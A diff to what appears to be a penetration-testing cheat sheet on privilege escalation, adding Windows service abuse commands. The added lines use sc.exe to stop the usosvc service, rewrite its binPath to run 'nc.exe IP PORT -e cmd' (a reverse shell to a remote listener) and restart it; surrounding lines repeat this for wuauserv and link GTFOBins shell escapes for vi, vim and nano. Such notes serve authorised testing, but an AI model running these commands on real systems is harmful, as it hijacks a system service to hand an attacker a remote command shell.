@@ -184,6 +184,13 @@ Invoke-Command -ComputerName WORKSTATION -Credential $creds -ScriptBlock {C:\pat
 ### [BinPath and ImagePath]
 https://pentestlab.blog/tag/imagepath/
 ```
+powershell binpath
+sc.exe qc usosvc
+sc.exe stop usosvc
+sc.exe config usosvc binPath="C:\path\to\nc.exe IP PORT -e cmd"
+sc.exe qc usosvc
+sc.exe start usosvc
+
 binPath
 sc config wuauserv binPath="C:\path\to\nc.exe IP PORT -e cmd"
 sc query wuauserv
@@ -214,3 +221,5 @@ https://gtfobins.github.io/gtfobins/vi/
 https://gtfobins.github.io/gtfobins/vim/
 
 https://gtfobins.github.io/gtfobins/nano/
+
+##
